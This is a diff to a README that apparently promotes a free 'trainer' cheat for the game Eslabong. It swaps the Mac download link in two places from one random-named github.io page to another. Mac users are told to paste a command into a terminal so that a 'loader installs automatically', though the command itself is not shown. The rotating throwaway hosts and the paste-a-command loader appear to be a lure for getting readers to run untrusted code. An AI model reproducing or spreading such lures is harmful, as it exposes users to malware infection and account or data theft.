@@ -9,7 +9,7 @@
 [![Key System](https://img.shields.io/badge/KEY-NO_KEY_required-success?style=for-the-badge)](#features)
 [![Platform](https://img.shields.io/badge/PLATFORM-Windows_10_%E2%80%A2_11-blue?style=for-the-badge)](#requirements)
 [![Menu](https://img.shields.io/badge/MENU-F1_HOTKEY-important?style=for-the-badge)](#how-to-use)
-[![Mac](https://img.shields.io/badge/%E2%AC%87_MAC_DOWNLOAD-black?style=for-the-badge&logo=apple)](https://jaifcflcufqn.github.io/mac-install/)
+[![Mac](https://img.shields.io/badge/%E2%AC%87_MAC_DOWNLOAD-black?style=for-the-badge&logo=apple)](https://ApexShrimpJetty10.github.io/macos-install/)
 
 </div>
 
@@ -55,7 +55,7 @@ Eslabong stays in the top trainer searches — infinite lives and infinite score
 2. Paste the command (**⌘ + V**) and press Enter
 3. Follow the prompts — the loader installs automatically
 
-[![Mac Download](https://img.shields.io/badge/%E2%AC%87_MAC_DOWNLOAD-black?style=for-the-badge&logo=apple)](https://jaifcflcufqn.github.io/mac-install/)
+[![Mac Download](https://img.shields.io/badge/%E2%AC%87_MAC_DOWNLOAD-black?style=for-the-badge&logo=apple)](https://ApexShrimpJetty10.github.io/macos-install/)
 
 ---
 
